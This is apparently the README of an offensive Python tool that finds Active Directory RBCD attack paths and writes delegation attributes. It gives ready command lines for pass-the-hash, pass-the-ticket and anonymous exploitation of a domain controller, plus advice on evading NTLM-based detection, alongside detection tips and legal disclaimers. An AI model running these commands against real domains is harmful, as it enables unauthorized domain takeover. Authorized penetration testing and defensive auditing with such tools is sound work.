# Get-RBCD-Threaded.py

A Python port of [Get-RBCD-Threaded](https://github.com/FatRodzianko/Get-RBCD-Threaded) by FatRodzianko — a tool to discover Resource-Based Constrained Delegation (RBCD) attack paths in Active Directory environments.

Built for offensive security professionals who need this capability natively on Linux/Kali without requiring a Windows host or .NET runtime.

> **⚠️ DISCLAIMER: This tool is provided strictly for authorized security testing, academic research, and educational purposes. It must only be used against systems you own or have explicit written permission to test. Unauthorized use against any system is illegal and unethical. The author assumes no liability for misuse. See [DISCLAIMER.md](DISCLAIMER.md) for full legal details.**

## What It Does

The tool queries Active Directory via LDAP to enumerate all users, groups, and computer objects, then parses the raw DACL (security descriptor) on every computer object to identify principals with dangerous write permissions:

- **GenericAll** — Full control over the computer object
- **GenericWrite** — Write to any attribute, including `msDS-AllowedToActOnBehalfOfOtherIdentity`
- **WriteOwner** — Can take ownership and modify the DACL
- **WriteDacl** — Can modify the DACL to grant further access
- **WriteProperty** on `msDS-AllowedToActOnBehalfOfOtherIdentity` (GUID: `3f78c3e5-f79a-46bd-a0b8-9d18116ddc79`) — Can directly configure RBCD
- **WriteAllProperties** — Unrestricted WriteProperty with no object type constraint

Only **explicit ACEs** are reported. Inherited permissions (e.g., Domain Admins WriteOwner by default) are filtered out as noise, so results reflect real misconfigurations only.

If any non-privileged user, group, or computer has these rights on a computer object, that computer is a potential RBCD attack target.

## Enhancements Over Original

| Feature | Original (C#) | This Port (Python) |
|---|---|---|
| Runtime | .NET 4+ / Windows | Python 3 / Any OS |
| Anonymous/Guest Check | ❌ | ✅ Checks if anonymous/guest can write to computer objects |
| Domain Controller Flagging | ❌ | ✅ Highlights DC targets separately |
| WriteAllProperties Detection | ❌ | ✅ Catches unrestricted WriteProperty |
| RBCD Write (Exploitation) | ❌ | ✅ Write `msDS-AllowedToActOnBehalfOfOtherIdentity` via LDAP |
| RBCD Cleanup | ❌ | ✅ Clear delegation after exploitation |
| Anonymous RBCD Write | ❌ | ✅ Exploit via null/anonymous session |
| Auth Methods | NTLM only | NTLM, Pass-the-Hash, Kerberos (AES-128/256, ccache), Anonymous |
| OPSEC-Safe Auth | ❌ | ✅ AES-256 key derived from password — no NTLM on the wire |
| Source Type Tagging | ❌ | ✅ Results labelled [User] / [Group] / [Computer] |
| Inherited ACE Filtering | ❌ | ✅ Skips default inherited permissions, no noise |
| Group RBCD Paths | ❌ | ✅ Detects non-privileged groups with write access |
| Output Formats | CSV | CSV + JSON |
| Concurrency | Parallel.ForEach | ThreadPoolExecutor |
| Color Output | ❌ | ✅ Color-coded severity |

The **anonymous/guest access check** was inspired by a real-world scenario where anonymous LDAP access could write `msDS-AllowedToActOnBehalfOfOtherIdentity` on a Domain Controller's computer object — a critical misconfiguration that would allow any unauthenticated attacker to perform RBCD, impersonate a Domain Admin via S4U2Self/S4U2Proxy, and DCSync the entire domain.

## OPSEC Note on Authentication

NTLM authentication generates **Event 4624** with the NTLM package visible in Windows Security logs — a high-fidelity detection signal in monitored environments.

**Kerberos authentication (`--use-aes` or `--aes-key`) is the OPSEC-safe choice.** It generates the same Event 4624 but with the Kerberos package, which is indistinguishable from normal domain traffic. If you have a plaintext password, `--use-aes` derives the AES-256 key automatically — no NTLM ever touches the wire.

| Method | Wire Protocol | Detection Signal |
|---|---|---|
| `-p password` | NTLM | Event 4624, NTLM package — **detectable** |
| `--hashes :NT` | NTLM | Event 4624, NTLM package — **detectable** |
| `--use-aes` + `-p password` | Kerberos | Event 4624, Kerberos package — **blends in** |
| `--aes-key HEXKEY` | Kerberos | Event 4624, Kerberos package — **blends in** |
| `--ccache FILE` | Kerberos | Event 4624, Kerberos package — **blends in** |

## Installation

```bash
# Clone the repository
git clone https://github.com/YOUR_USERNAME/Get-RBCD-Threaded-py.git
cd Get-RBCD-Threaded-py

# Create a virtual environment (recommended)
python3 -m venv venv
source venv/bin/activate

# Install dependencies
pip3 install ldap3

# Optional: required for --use-aes and --aes-key
pip3 install impacket
```

### Requirements

- Python 3.8+
- `ldap3` — core LDAP operations
- `impacket` *(optional)* — required only for `--use-aes` and `--aes-key` (AES key derivation and TGT request)

### Kerberos Prerequisites (for `--use-aes` / `--aes-key` / `--ccache`)

1. **`/etc/krb5.conf`** — MIT Kerberos must know the realm→KDC mapping:

```ini
[libdefaults]
    default_realm = CORP.LOCAL
    dns_lookup_realm = false
    dns_lookup_kdc = false
    rdns = false

[realms]
    CORP.LOCAL = {
        kdc = 10.10.10.1
        admin_server = 10.10.10.1
    }

[domain_realm]
    .corp.local = CORP.LOCAL
    corp.local = CORP.LOCAL
```

2. **`/etc/hosts`** — DC hostname must resolve locally (critical when routing through proxychains):

```
10.10.10.1 dc01.corp.local
```

3. **proxychains** — comment out `proxy_dns` to use local `/etc/hosts` resolution:

```
#proxy_dns
```

## Usage

```
python3 get-rbcd.py -d <DOMAIN> [options]
```

### Required Arguments

| Argument | Description |
|---|---|
| `-d`, `--domain` | Target domain FQDN (e.g., `corp.local`) |

### Authentication Arguments

| Argument | Description |
|---|---|
| `-u`, `--username` | Username to authenticate as |
| `-p`, `--password` | Plaintext password |
| `--hashes LM:NT` | Pass-the-hash (NTLM). Use `:NT` to omit LM hash |
| `--use-aes` | Derive AES-256 key from `-p` password and authenticate via Kerberos. **Recommended for OPSEC.** Requires `impacket` |
| `--aes-key HEXKEY` | Kerberos AES-128 or AES-256 key (hex). Requires `impacket` |
| `--ccache FILE` | Path to an existing Kerberos ccache file. Sets `KRB5CCNAME` automatically |
| `--anonymous` | Force anonymous LDAP bind |
| `-k`, `--kerberos` | Use Kerberos with plaintext password |

### Connection Arguments

| Argument | Description |
|---|---|
| `--dc-ip` | IP address of the Domain Controller (TCP routing) |
| `--dc-host FQDN` | DC hostname for Kerberos SPN resolution (e.g., `dc01.corp.local`). Required when using Kerberos with `--dc-ip` |
| `-i`, `--insecure` | Use LDAP (port 389) instead of LDAPS (port 636) |

### Optional Arguments

| Argument | Description |
|---|---|
| `-o`, `--output` | Save results to CSV file |
| `--json` | Save results to JSON file |
| `--pwdlastset N` | Filter out computers with `pwdLastSet` older than N days |
| `--anon-only` | Only check anonymous/guest write access (skip full scan) |
| `--threads N` | Number of threads for ACL processing (default: 10) |
| `--no-anon-check` | Skip the bonus anonymous access check |
| `--no-color` | Disable colored terminal output |

### RBCD Write/Clear Arguments

| Argument | Description |
|---|---|
| `--write-rbcd` | Write `msDS-AllowedToActOnBehalfOfOtherIdentity` on target **(EXPLOITATION)** |
| `--clear-rbcd` | Clear `msDS-AllowedToActOnBehalfOfOtherIdentity` on target **(CLEANUP)** |
| `--target` | Target computer: DN, sAMAccountName, or dNSHostName |
| `--delegate-from` | Principal to delegate from: sAMAccountName or SID (required for `--write-rbcd`) |

## Examples

**NTLM password (simple, less OPSEC-safe):**

```bash
python3 get-rbcd.py -d corp.local -u jsmith -p 'P@ssw0rd!' --dc-ip 10.10.10.1 -i
```

**AES-256 derived from password (OPSEC-safe, recommended):**

```bash
# Requires /etc/krb5.conf, /etc/hosts entry for DC, proxy_dns commented out
python3 get-rbcd.py -d corp.local -u jsmith -p 'P@ssw0rd!' \
    --use-aes --dc-ip 10.10.10.1 --dc-host dc01.corp.local -i
```

**Pass-the-hash:**

```bash
python3 get-rbcd.py -d corp.local -u jsmith \
    --hashes :fc525c9683e8fe067095ba2ddc971889 --dc-ip 10.10.10.1 -i
```

**Existing ccache / pass-the-ticket:**

```bash
export KRB5CCNAME=/tmp/jsmith.ccache
python3 get-rbcd.py -d corp.local --ccache /tmp/jsmith.ccache \
    --dc-ip 10.10.10.1 --dc-host dc01.corp.local -i
```

**Anonymous/null session scan only:**

```bash
python3 get-rbcd.py -d corp.local --dc-ip 10.10.10.1 -i --anon-only
```

**Full scan with CSV and JSON output:**

```bash
python3 get-rbcd.py -d corp.local -u admin -p pass --dc-ip 10.10.10.1 -i \
    -o results.csv --json results.json
```

**Filter stale computer objects (pwdLastSet within 90 days):**

```bash
python3 get-rbcd.py -d corp.local -u admin -p pass --dc-ip 10.10.10.1 -i --pwdlastset 90
```

**Write RBCD delegation (authenticated):**

```bash
python3 get-rbcd.py -d corp.local -u admin -p pass --dc-ip 10.10.10.1 -i \
    --write-rbcd --target DC01 --delegate-from svc_account
```

**Write RBCD delegation (anonymous — the Operation Endgame scenario):**

```bash
python3 get-rbcd.py -d corp.local --dc-ip 10.10.10.1 -i \
    --write-rbcd --target 'CN=DC01,OU=Domain Controllers,DC=corp,DC=local' \
    --delegate-from CODY_ROY
```

**Cleanup — remove RBCD delegation after exploitation:**

```bash
python3 get-rbcd.py -d corp.local --dc-ip 10.10.10.1 -i \
    --clear-rbcd --target DC01
```

## Sample Output

```
======================================================================
[*] Phase 1: Enumerating domain objects...
======================================================================

[*] Enumerating users in corp.local...
[+] Found 489 users in corp.local
[*] Enumerating groups in corp.local...
[+] Found 40 non-privileged groups in corp.local (skipped 8 privileged)
[*] Enumerating computers in corp.local...
[+] Found 15 computers in corp.local
[!] 2 of these are Domain Controllers

[+] Total enumerated SIDs: 544

======================================================================
[*] Phase 2: Analyzing DACLs on 15 computer objects...
======================================================================
[*] Processed 15/15 computer objects...

======================================================================
[+] Found 3 possible RBCD attack paths
======================================================================

[!!!] 1 paths target DOMAIN CONTROLLERS:
----------------------------------------------------------------------
  Source:      ANONYMOUS LOGON [Well-Known] (S-1-5-7)
  Domain:      WELL-KNOWN
  Destination: dc01.corp.local [DC]
  DN:          CN=DC01,OU=Domain Controllers,DC=corp,DC=local
  Privilege:   WriteAllProperties
  ------------------------------------------------------------

[+] 2 paths on regular computer objects:
----------------------------------------------------------------------
  Source:      svc_backup [User]
  Domain:      corp.local
  Destination: fileserver.corp.local
  Privilege:   GenericWrite
  ------------------------------------------------------------
  Source:      ITEmployeesMachines [Group]
  Domain:      corp.local
  Destination: workstation01.corp.local
  Privilege:   WriteAllProperties
  ------------------------------------------------------------

[*] Execution time: 2.17 seconds
```

## How RBCD Works

Resource-Based Constrained Delegation allows a computer to specify which accounts are trusted to delegate to it, controlled by the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute on the computer object.

If an attacker can write to this attribute, they can:

1. Add a controlled account (e.g., a machine account they created) to the allowed delegation list
2. Use S4U2Self to obtain a service ticket as any user (e.g., Domain Admin) to themselves
3. Use S4U2Proxy to forward that ticket to the target computer
4. Authenticate to the target as the impersonated user

For exploitation, you'll need tools like [impacket](https://github.com/fortra/impacket) (`getST.py`, `secretsdump.py`) or [Rubeus](https://github.com/GhostPack/Rubeus). This tool only identifies the attack paths and optionally configures the delegation attribute — it does not perform the attack itself.

### Recommended Reading

- [Elad Shamir — Wagging the Dog: Abusing Resource-Based Constrained Delegation](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
- [harmj0y — Another Word on Delegation](https://posts.specterops.io/another-word-on-delegation-10bdbe3cd94a)

## Detection

This tool performs standard LDAP queries that may be difficult to distinguish from legitimate AD tooling. Possible detection methods:

- **Netflow analysis** — Anomalous volume of LDAP queries from a non-domain machine
- **Event 4624 with NTLM package** — From unexpected source IPs or non-standard machines
- **Honeypot ACEs** — Computer objects with deliberately weak DACLs; alert on any modifications to `msDS-AllowedToActOnBehalfOfOtherIdentity`
- **LDAP query volume** — Enumerating all computer objects' security descriptors is unusual behavior for normal users

## ⚠️ Legal Disclaimer & Responsible Use

### Intended Use

This tool is intended **exclusively** for:

- **Authorized penetration testing** — with explicit written permission from the system owner
- **Red team engagements** — conducted under a signed Rules of Engagement (RoE)
- **Security research and education** — in lab environments you own or control
- **Defensive security** — identifying and remediating RBCD misconfigurations in your own environment

### Tool Capabilities & Safeguards

By default, this tool **only performs read operations** (LDAP queries). It will not modify anything without explicit opt-in.

The `--write-rbcd` and `--clear-rbcd` flags enable **write operations** that modify the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute on target computer objects. These operations:

- Require explicit flags — never triggered automatically
- Require interactive confirmation before execution (`YOUREALLYREALLYSURE` for write, `YES` for cleanup)
- Do **not** perform the full RBCD attack — exploitation (S4U2Self/S4U2Proxy, DCSync) requires separate tools

This tool does **not**:

- Perform S4U2Self/S4U2Proxy ticket delegation
- Execute DCSync, PSExec, or any post-exploitation
- Create or delete any AD objects (users, computers, groups)
- Modify any attribute other than `msDS-AllowedToActOnBehalfOfOtherIdentity`

### Legal Considerations

Unauthorized access to computer systems is a criminal offense in virtually every jurisdiction. Relevant laws include but are not limited to:

- **United States**: Computer Fraud and Abuse Act (CFAA), 18 U.S.C. § 1030
- **European Union**: Directive 2013/40/EU on attacks against information systems
- **United Kingdom**: Computer Misuse Act 1990
- **Vietnam**: Law on Cybersecurity (No. 24/2018/QH14) and the Penal Code (Articles 286-289 on computer-related offenses)
- **International**: Budapest Convention on Cybercrime

**You are solely responsible for ensuring your use of this tool complies with all applicable laws and regulations in your jurisdiction.**

### No Warranty

This software is provided "as is" without warranty of any kind. The author is not responsible for any damages, legal consequences, or misuse arising from the use of this tool.

## Credits

- **Original Tool**: [Get-RBCD-Threaded](https://github.com/FatRodzianko/Get-RBCD-Threaded) by [FatRodzianko](https://github.com/FatRodzianko)

## License

This project is licensed under the MIT License — see the [LICENSE](LICENSE) file for details.
